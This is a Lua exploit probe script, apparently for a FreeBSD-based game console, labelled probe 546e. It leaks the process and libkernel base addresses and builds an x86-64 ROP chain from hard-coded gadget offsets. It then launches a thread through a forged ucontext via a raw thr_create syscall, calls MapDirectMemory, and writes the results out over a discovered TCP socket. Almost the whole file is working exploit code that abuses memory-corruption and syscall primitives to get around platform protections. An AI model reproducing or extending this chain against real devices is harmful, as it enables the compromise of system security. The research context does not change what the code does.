-- CRASH_CLASS: MODERATE
-- PROBE 546e: MapDM child — write results to TCP via ROP write() syscall
--
-- 546d confirmed: thr_create returns rv=0 with MapDM chain.
-- The crash happens when MapDM corrupts process state and main thread
-- tries a Lua memory op. The child's ROP chain uses raw x86 (no Lua),
-- so it can still write results after MapDM returns.
--
-- Plan: child does MapDM → stores results to shared → write(fd, shared, 48)
-- to send results over TCP before the process dies.
-- Parent does long nanosleep (stays in kernel, no Lua ops = no crash).

print("=== PROBE 546e: MapDM + write() back ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local syscall_ret = syscall.pipe.fn_addr

-- Address discovery
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))

print("EBOOT=" .. q(eboot) .. " LK=" .. q(lk))

local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self        = eboot + uint64(0x15481)

local map_fn   = lk + uint64(0x15020)
local alloc_fn = lk + uint64(0x17EF0)

-- AllocateDirectMemory
print("[A] AllocDM")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FATAL"); return end

-- Resources
print("[B] Setup")
local stk, shared, tcb_page
pcall(function() stk = sc_mmap(uint64(0), uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() shared = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() tcb_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

-- Shared page layout:
--   [0x00] virt_out (MapDM writes VA here) — ZERO on input
--   [0x08] rv (child stores MapDM return)
--   [0x10] done marker (child writes 0x444F4E45)
--   [0x18] write_rv (child stores write() return value)
--   [0x20-0x2F] ASCII header "546e:MAPDM:" (12 bytes) — search marker
--   [0x100] timespec {0, 300000000} for 300ms delay
zero(shared, 0x200)

-- Write search marker at shared+0x20 so we can find binary results in output
-- "546e" in ASCII = 0x35 0x34 0x36 0x65
wd(shared + 0x20, 0x65363435)  -- "546e" LE
wd(shared + 0x24, 0x50414D3A)  -- ":MAP" LE
wd(shared + 0x28, 0x003A4D44)  -- "DM:\0" LE

-- Timespec for child delay
wq(shared + 0x100, uint64(0))
wq(shared + 0x108, uint64(300000000))  -- 300ms

print("  stk=" .. q(stk) .. " shared=" .. q(shared))

-- Determine TCP socket fd
-- The Lua loader uses the TCP connection for output.
-- We'll try writing to fds 1-10 from the child to find which one works.
-- For now, try fd 6 (common for game process sockets) and fd 1 (stdout).
-- We'll write to BOTH — one of them should reach the Mac.
-- Actually, we know from probe 384b that write(3-arg) works from child.
-- Let's find the fd by trying fstat on small fds.
print("[C] Find socket fd")
local sc_fstat = make_syscall(189)  -- fstat
local stat_buf = memory.alloc(0x100)
local socket_fd = -1
for fd = 3, 15 do
    zero(stat_buf, 0x100)
    local ok_f, rv_f = pcall(function()
        return sc_fstat(uint64(fd), uint64(stat_buf))
    end)
    if ok_f and to_num(rv_f) == 0 then
        local mode = rd(stat_buf + 4)  -- st_mode at offset 4 in FreeBSD stat
        if mode then
            local fmt = bit32 and bit32.band(mode, 0xF000) or (mode % 0x10000 - mode % 0x1000)
            -- S_IFSOCK = 0xC000
            if fmt == 0xC000 or (mode >= 0xC000 and mode < 0xD000) then
                socket_fd = fd
                print("  fd " .. fd .. ": SOCKET (mode=0x" .. string.format("%X", mode) .. ")")
                break
            else
                print("  fd " .. fd .. ": mode=0x" .. string.format("%X", mode))
            end
        end
    end
end

-- Fallback: also find by trying getpeername
if socket_fd < 0 then
    print("  No socket found by fstat, trying getpeername...")
    local sc_getpeername = make_syscall(31)
    local sa_buf = memory.alloc(0x80)
    local sa_len = memory.alloc(4)
    for fd = 3, 15 do
        wd(sa_len, 0x80)
        local ok_g, rv_g = pcall(function()
            return sc_getpeername(uint64(fd), uint64(sa_buf), uint64(sa_len))
        end)
        if ok_g and to_num(rv_g) == 0 then
            socket_fd = fd
            print("  fd " .. fd .. ": getpeername OK — this is the TCP socket")
            break
        end
    end
end

if socket_fd < 0 then
    print("  WARNING: no socket fd found, using fd 6 as guess")
    socket_fd = 6
end
print("  Using fd=" .. socket_fd)

-- Build chain
print("[D] Chain")
local chain = stk + 0x200000 - 0x1000
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- CRITICAL: after every syscall;ret, its `ret` pops the next stack slot as RIP.
-- That slot MUST be a valid gadget (pop_rax_ret), not a raw number.
-- Probes 546a-546d missed this → child jumped to 0xA5 → SIGSEGV → crash.
-- MapDM was NEVER called in those probes.

-- Phase 0: nanosleep(300ms) — let parent finish and enter sleep
emit(uint64(240))            -- rax = nanosleep (via initial pop_rax_ret RIP)
emit(pop_rdi_ret)
emit(shared + 0x100)         -- &timespec
emit(pop_rsi_ret)
emit(uint64(0))              -- rem = NULL
emit(syscall_ret)            -- nanosleep; ret → pops next as RIP:
emit(pop_rax_ret)            -- ← BRIDGE: syscall's ret lands here

-- Phase 1: sysarch(SET_FSBASE) — fake TCB for errno in MapDM
emit(uint64(165))            -- rax = sysarch
emit(pop_rdi_ret)
emit(uint64(129))            -- AMD64_SET_FSBASE
emit(pop_rsi_ret)
emit(tcb_ptr)
emit(syscall_ret)            -- sysarch; ret → pops next as RIP:
-- After sysarch, next is pop_rdi_ret (valid gadget) → no bridge needed

-- Phase 2: MapDM(shared, 0x4000, 3, 0, R8=phys, R9=align)
-- R8/R9 survive syscalls (kernel preserves them); set in ucontext
emit(pop_rdi_ret)
emit(shared)                 -- &virt_out = shared (reads *addr=0 → kernel picks VA)
emit(pop_rsi_ret)
emit(uint64(0x4000))         -- len = 16KB
emit(pop_rdx_ret)
emit(uint64(3))              -- prot = PROT_READ|PROT_WRITE
emit(pop_rcx_ret)
emit(uint64(0))              -- flags = 0
emit(map_fn)                 -- call MapDM (C func); its ret → pops next:
-- After C function ret, next is pop_rdi_ret (valid) → no bridge needed

-- Phase 3: Store MapDM rv → shared[0x08]
emit(pop_rdi_ret)
emit(shared + 0x08)
emit(mov_rdi_rax_ret)        -- *shared[0x08] = rax (MapDM return value)

-- Phase 4: Done marker → shared[0x10]
emit(pop_rdi_ret)
emit(shared + 0x10)
emit(pop_rax_ret)
emit(uint64(0x444F4E45))     -- "DONE"
emit(mov_rdi_rax_ret)        -- *shared[0x10] = 0x444F4E45; ret → pops next:

-- Phase 5: write(socket_fd, shared, 0x30) — send 48 bytes over TCP
emit(pop_rax_ret)            -- ← BRIDGE: mov_rdi_rax's ret lands here
emit(uint64(4))              -- rax = write syscall
emit(pop_rdi_ret)
emit(uint64(socket_fd))      -- fd
emit(pop_rsi_ret)
emit(shared)                 -- buf = shared page start
emit(pop_rdx_ret)
emit(uint64(0x30))           -- count = 48 bytes
emit(syscall_ret)            -- write(); ret → pops next as RIP:
-- After write syscall, next is pop_rdi_ret (valid) → no bridge needed

-- Phase 6: Store write() rv → shared[0x18]
emit(pop_rdi_ret)
emit(shared + 0x18)
emit(mov_rdi_rax_ret)        -- *shared[0x18] = write return value

-- Phase 7: Park
emit(jmp_self)

print("  entries=" .. (i/8) .. " chain at " .. q(chain))

-- ucontext
local ctx = memory.alloc(0x500)
zero(ctx, 0x4C0)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)
wq(ctx + 0x0F8, chain)
wq(ctx + 0x068, phys)            -- R8
wq(ctx + 0x070, uint64(0x4000))  -- R9

-- Print everything BEFORE thr_create — after this, process may die
print("[E] Launching child")
print("  R8=" .. q(phys) .. " R9=0x4000 fd=" .. socket_fd)
print("  Child will: sleep 300ms → sysarch → MapDM → write results to fd " .. socket_fd)
print("  Look for '546e:MAPDM:' marker in binary output")
print("  shared=" .. q(shared) .. " (search for these bytes)")
print("MARKER-START")

-- Launch child
local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local rv_n = ok_tc and to_num(rv_tc) or -999
local tid = rq(tid_buf)
print("thr_create: rv=" .. rv_n .. " tid=" .. q(tid))

if rv_n ~= 0 then
    print("REJECTED")
    return
end

-- Parent: long sleep — stay in kernel while child does MapDM
-- This avoids Lua operations that would crash after MapDM corruption.
print("SLEEPING 3s (child works during this)...")

local long_sleep = memory.alloc(16)
wq(long_sleep, uint64(3))         -- tv_sec = 3
wq(long_sleep + 8, uint64(0))     -- tv_nsec = 0
pcall(function() sc_nanosleep(uint64(long_sleep), uint64(0)) end)

-- If we get here, the process survived! Try reading results.
print("WOKE UP — trying to read shared page...")
local ok_rd, virt = pcall(function() return memory.read_qword(shared) end)
if ok_rd and virt then
    print("  virt=" .. q(virt))
    local rv = rq(shared + 0x08)
    local done = rq(shared + 0x10)
    print("  rv=" .. (rv and q(rv) or "nil"))
    print("  done=" .. (done and q(done) or "nil"))
else
    print("  READ FAILED — MapDM corrupted Lua (expected)")
    print("  Check binary output for '546e:MAPDM:' marker")
end

print("=== 546e DONE ===")
